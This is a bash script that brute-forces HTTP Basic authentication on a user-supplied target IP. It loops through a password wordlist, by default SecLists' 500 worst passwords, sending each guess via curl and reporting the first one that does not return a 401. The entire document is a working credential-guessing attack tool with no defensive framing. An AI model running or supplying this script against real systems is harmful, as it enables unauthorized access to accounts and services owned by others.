#!/bin/bash

 read -r -p "Enter target IP:" target

d_wordlist='/usr/share/wordlists/seclists/Passwords/Common-Credentials/500-worst-passwords.txt'

read -r  -p "Enter  absoulte file-path to wordlist e.g /home/user/wordlist.txt      (Default path = $wordlist, press enter to use it.) : " wordlist

if  [ "$wordlist" = "" ]; then
	if [ ! -e "$d_wordlist" ]; then
		echo -e "Please install seclists to continue. https://github.com/danielmiessler/SecLists"
		exit
	fi
	wordlist="$d_wordlist"
else

	if [ ! -e "$wordlist" ]; then
		echo -e "File could not be found at path:  '$wordlist' "
		echo -e  "Make sure you provided absoulte file path e.g '/home/user/passwords.txt'  and not '~/passwords.txt'"
		exit
	fi

fi

read -r -p "Enter username to bruteforce:" username

while IFS= read -r passwrd; do

        info=$(echo -n "$username:$passwrd" | base64)
        status_code=$(curl  -s -i -H "Authorization: Basic $info" http://$target/ -o /dev/null -w "%{http_code}")

if [ $status_code != '401' ]; then

                echo "[+] Valid password found: $passwrd"
        sleep 2
        break
else
         echo "[-]  Invalid password!"
        #echo "$passwrd:$info"   
fi

        done < "$wordlist"

